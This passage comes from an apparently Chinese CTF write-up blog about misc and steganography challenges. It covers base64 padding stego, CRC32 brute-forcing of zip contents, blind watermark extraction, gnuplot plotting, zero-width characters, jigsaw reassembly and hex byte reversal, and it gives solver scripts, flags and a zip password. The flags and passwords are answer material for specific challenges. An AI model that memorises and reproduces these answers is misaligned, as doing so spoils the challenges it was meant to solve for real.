class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(s2)):<br>        <span class="hljs-keyword">if</span> s1[i] != s2[i]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_stego</span>():</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_lines = f.readlines()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_lines:<br>            steg_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = get_base64_diff_value(steg_line, norm_line)<br>            <span class="hljs-built_in">print</span> diff<br>            pads_num = steg_line.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-keyword">if</span> diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].zfill(pads_num * <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">else</span>:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span> goflag(bin_str)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">goflag</span>(<span class="hljs-params">bin_str</span>):</span><br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res_str<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve_stego()<br></code></pre></td></tr></table></figure><p>最终得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GXY&#123;fazhazhenhaoting&#125;<br></code></pre></td></tr></table></figure><h2 id="16-CRC碰撞"><a href="#16-CRC碰撞" class="headerlink" title="16. CRC碰撞"></a>16. CRC碰撞</h2><p>下载附件，都是压缩包<br><img src="https://img-blog.csdnimg.cn/20201220185929452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>CRC碰撞，根据彩虹排序颜色排序，红橙黄绿青，CRC32值分别为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">红 <span class="hljs-number">555</span>FA1A2<br>橙 E5C67F46  <br>黄 <span class="hljs-number">6E957</span>E45<br>绿 <span class="hljs-number">76</span>D6A31A<br>青 <span class="hljs-number">2</span>B042586<br></code></pre></td></tr></table></figure><p>补充上0x开头，使用脚本进行碰撞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br>dic=string.printable  <br>crc1 = <span class="hljs-number">0xe5c67f46</span>  <br>crc2 = <span class="hljs-number">0x555fa1a2</span><br>crc3 = <span class="hljs-number">0x6e957e45</span><br>crc4 = <span class="hljs-number">0x76d6a31a</span><br>crc5 = <span class="hljs-number">0x2b042586</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackCrc4</span>(<span class="hljs-params">crc</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic :<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> dic:<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> dic:<br>                        s=i+j+p+q<br>                        <span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode(<span class="hljs-string">&quot;ascii&quot;</span>))):<br>                            <span class="hljs-built_in">print</span> (s)<br>                            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>CrackCrc4(crc1)<br>CrackCrc4(crc2)<br>CrackCrc4(crc3)<br>CrackCrc4(crc4)<br>CrackCrc4(crc5)<br></code></pre></td></tr></table></figure><p>脚本跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">cG90<br>aW9u<br>Z2Vu<br>YjEy<br>Mw==<br></code></pre></td></tr></table></figure><h2 id="17-Base转图片"><a href="#17-Base转图片" class="headerlink" title="17. Base转图片"></a>17. Base转图片</h2><p>打开flag.txt，发现<code>data:image/png;base64</code>开头，<br><img src="https://img-blog.csdnimg.cn/20201220191131642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在线网站<a href="http://tool.chinaz.com/tools/imgtobase/">Base64转图片</a><br><img src="https://img-blog.csdnimg.cn/20201220191344451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="18-盲水印"><a href="#18-盲水印" class="headerlink" title="18. 盲水印"></a>18. 盲水印</h2><h3 id="BlindWaterMark"><a href="#BlindWaterMark" class="headerlink" title="BlindWaterMark"></a>BlindWaterMark</h3><p>下载地址：<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p><p>需要安装cv2库，pip install opencv-python</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python2 -m pip install opencv-python<br></code></pre></td></tr></table></figure><p>合成盲水印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python bwm.py encode hui.png wm.png hui_with_wm.png<br></code></pre></td></tr></table></figure><p>提取图中的盲水印</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">python2 bwm.py decode <span class="hljs-number">2.</span>png <span class="hljs-number">1.</span>png  flag.png<br>或者<br>python3 bwmforpy3.py decode <span class="hljs-number">2.</span>png <span class="hljs-number">1.</span>png flag.png<br><span class="hljs-comment">#2.png     --original &lt;原始图像文件&gt;</span><br><span class="hljs-comment">#1.png     --image &lt;图像文件&gt; </span><br><span class="hljs-comment">#flag.png  --result &lt;结果文件&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215182146821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="频域盲水印"><a href="#频域盲水印" class="headerlink" title="频域盲水印"></a>频域盲水印</h3><p>参考文章：<a href="https://xz.aliyun.com/t/1875/#toc-9">https://xz.aliyun.com/t/1875/#toc-9</a><br> <strong>[GWCTF2019]huyao</strong><br>频域盲水印脚本： BlindWaterMarkplus.py </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import cv2   <br>import numpy as np<br>import random<br>import os<br>from argparse import ArgumentParser<br>ALPHA = 5<br>def build_parser():<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;--original&#x27;</span>, dest=<span class="hljs-string">&#x27;ori&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--image&#x27;</span>, dest=<span class="hljs-string">&#x27;img&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--result&#x27;</span>, dest=<span class="hljs-string">&#x27;res&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--alpha&#x27;</span>, dest=<span class="hljs-string">&#x27;alpha&#x27;</span>, default=ALPHA)<br>    <span class="hljs-built_in">return</span> parser<br>def main():<br>    parser = build_parser()<br>    options = parser.parse_args()<br>    ori = options.ori<br>    img = options.img<br>    res = options.res<br>    alpha = options.alpha<br>    <span class="hljs-keyword">if</span> not os.path.isfile(ori):<br>        parser.error(<span class="hljs-string">&quot;original image %s does not exist.&quot;</span> % ori)<br>    <span class="hljs-keyword">if</span> not os.path.isfile(img):<br>        parser.error(<span class="hljs-string">&quot;image %s does not exist.&quot;</span> % img)<br>    decode(ori, img, res, alpha)<br>def decode(ori_path, img_path, res_path, alpha):<br>    ori = cv2.imread(ori_path)<br>    img = cv2.imread(img_path)<br>    ori_f = np.fft.fft2(ori)<br>    img_f = np.fft.fft2(img)<br>    height, width = ori.shape[0], ori.shape[1]<br>    watermark = (ori_f - img_f) / alpha<br>    watermark = np.real(watermark)<br>    res = np.zeros(watermark.shape)<br>    random.seed(height + width)<br>    x = range(height / 2)<br>    y = range(width)<br>    random.shuffle(x)<br>    random.shuffle(y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(height / 2):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(width):<br>            res[x[i]][y[j]] = watermark[i][j]<br>    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>python BlindWaterMarkplus.py --original huyao.png --image stillhuyao.png --result res.png<br></code></pre></td></tr></table></figure><p>然后，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python BlindWaterMarkplus.py --original huyao.png --image stillhuyao.png --result res.png<br></code></pre></td></tr></table></figure><p>得到res.png<br><img src="https://img-blog.csdnimg.cn/20210321202802305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="JAVA盲水印"><a href="#JAVA盲水印" class="headerlink" title="JAVA盲水印"></a>JAVA盲水印</h3><p>项目地址：<a href="https://github.com/ww23/BlindWaterMark/releases">https://github.com/ww23/BlindWaterMark/releases</a></p><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214526121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="19-gnuplot画图"><a href="#19-gnuplot画图" class="headerlink" title="19. gnuplot画图"></a>19. gnuplot画图</h2><p><strong>[BUUCTF]- 梅花香之苦寒来</strong><br>用010 editor打开图片，在文件尾发现大量数据<br><img src="https://img-blog.csdnimg.cn/20210215193630106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制到Notepad++，使用 <a href="https://blog.csdn.net/anialy/article/details/8183108"> hex转ascll插件</a><br><img src="https://img-blog.csdnimg.cn/2021041219410026.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>转换为gnuplot能识别的内容<br><img src="https://img-blog.csdnimg.cn/20210412194159948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用gnuplot工具画图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">plot <span class="hljs-string">&quot;m.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210412194421242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码即可得到flag</p><p>看了其他人的解法，大师傅的<a href="https://blog.csdn.net/weixin_45485719/article/details/107427378">python脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;m.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> h:<br>    h = h.read()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ascii.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> a:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(h), <span class="hljs-number">2</span>):<br>        tmp = <span class="hljs-string">&#x27;0x&#x27;</span>+h[i]+h[i+<span class="hljs-number">1</span>]<br>        tmp = <span class="hljs-built_in">int</span>(tmp, base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(tmp) != <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">chr</span>(tmp) != <span class="hljs-string">&#x27;)&#x27;</span>:<br>            a.write(<span class="hljs-built_in">chr</span>(tmp))<br><br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;ascii.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;,&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br><br></code></pre></td></tr></table></figure><h2 id="20-零宽字符加密"><a href="#20-零宽字符加密" class="headerlink" title="20. 零宽字符加密"></a>20. 零宽字符加密</h2><p> [UTCTF2020]zero<br>下载附件，使用vim命令可以看到零宽字符<br><img src="https://img-blog.csdnimg.cn/20210215194854868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在线网站，<a href="https://330k.github.io/misc_tools/unicode_steganography.html">零宽度字符隐写解密</a><br><img src="https://img-blog.csdnimg.cn/20210215194959537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="21-gaps拼图"><a href="#21-gaps拼图" class="headerlink" title="21. gaps拼图"></a>21. gaps拼图</h2><p><strong>BUUCTF：[MRCTF2020]不眠之夜</strong></p><p>下载附件，删去不必要的文件，查看文件夹属性，一共120张图片<br><img src="https://img-blog.csdnimg.cn/20210209214055358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再查看图片属性，分辨率为200x100<br><img src="https://img-blog.csdnimg.cn/20210209214221765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.使用 <code>montage</code> 命令将碎片合成为一张图片,得到flag.jpg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209213858493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 .将生成的flag.jpg拖到gaps的bin目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gaps --image=flag.jpg --generations=40 --population=120 --size=100<br><span class="hljs-comment">#population为图片数量，size为每个图片高度</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209213715280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>[第一届SXC CTF]拼图</strong></p><p>将100张碎片合成，每个图片分辨率为192x120，生成的out.png分辨率为1920x1200</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">montage *png -tile 10x10 -geometry 192x120+0+0 out.png<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209232712628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改拼接后的图片大小，改为1200x1200<br><img src="https://img-blog.csdnimg.cn/2021020923275864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还原拼图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gaps --image=out.png --generation=30 --population=300 --size=120<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209232354216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="22-十六进制文件字节左右翻转"><a href="#22-十六进制文件字节左右翻转" class="headerlink" title="22.十六进制文件字节左右翻转"></a>22.十六进制文件字节左右翻转</h2><p><strong>[2020金盾信安杯]-我和十六有个约定</strong><br>内容：链接: <a href="https://pan.baidu.com/s/1LJiUaVyANUZBN4bb1SHiCQ">https://pan.baidu.com/s/1LJiUaVyANUZBN4bb1SHiCQ</a> 密码: u5sr</p><p>下载附件，得到ababab.png和flag.zip<br>010打开ababab.png，发现其实是GIF，不过没什么用，拖到最后，看到keyis7034735377307244<br><img src="https://img-blog.csdnimg.cn/20201220215029846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>十六进制转字符串，得到p4sSw0rD，这就是压缩包密码解压文件flag.txt和splice.txt<br>flag.txt内容为</p><p><img src="https://img-blog.csdnimg.cn/20201220215035717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现第一行<code>FF D8 FF E0</code>，倒着读是jpg的文件头，找到一个脚本将flag.txt反转，生成output.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>out.close()<br>out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> fl <span class="hljs-keyword">in</span> f.readlines():<br>    temp=re.findall(<span class="hljs-string">r&#x27;.&#123;2&#125;&#x27;</span>,fl)<br>    order=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        order.append(i)<br>    order.reverse()   <br>    print(<span class="hljs-string">&#x27;&#x27;</span>.join(order))<br>    out.write(<span class="hljs-string">&#x27;&#x27;</span>.join(order)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br>out.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020122021510034.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>去掉空格<br><img src="https://img-blog.csdnimg.cn/2020122021510621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再贴上一位大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">re = []<br>s = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag1.txt&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)     <span class="hljs-comment">#以覆盖的方式进行写文件</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>);          <span class="hljs-comment">#打开文件,进行读取内容</span><br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():       <span class="hljs-comment">#调用readlines()一次读取所有内容并按行返回list</span><br>    re = line.split(<span class="hljs-string">&#x27; &#x27;</span>)         <span class="hljs-comment">#split()函数以空格为划分生成了一个新的列表并放入re[]中</span><br>    re = re[:-<span class="hljs-number">1</span>]                 <span class="hljs-comment">#因为readlines返回的每一行最后都有/n换行符，所以要去掉</span><br>    re = re[::-<span class="hljs-number">1</span>]                <span class="hljs-comment">#使列表中的值逆序</span><br>    s.write(<span class="hljs-string">&quot; &quot;</span>.join(re) + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#join()函数用于列表格式化输出，用空格相连接</span><br><br>s.close()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210210182743695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开010，新建一个Hex file，把编辑后的output.txt内容粘贴进去</p><p><img src="https://img-blog.csdnimg.cn/20201220215112849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>文件头是FF D8 FF E0，是jpg文件，另存为output.jpg，得到一张残缺的二维码<br><img src="https://img-blog.csdnimg.cn/20201220215120408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>splice.txt内容为<br><img src="https://img-blog.csdnimg.cn/20201220215127795.png" alt="在这里插入图片描述"></p><p>Base64转换为图片<br><img src="https://img-blog.csdnimg.cn/20201220215133634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>补全二维码，扫码得到flag<br><img src="https://img-blog.csdnimg.cn/20201220215139387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 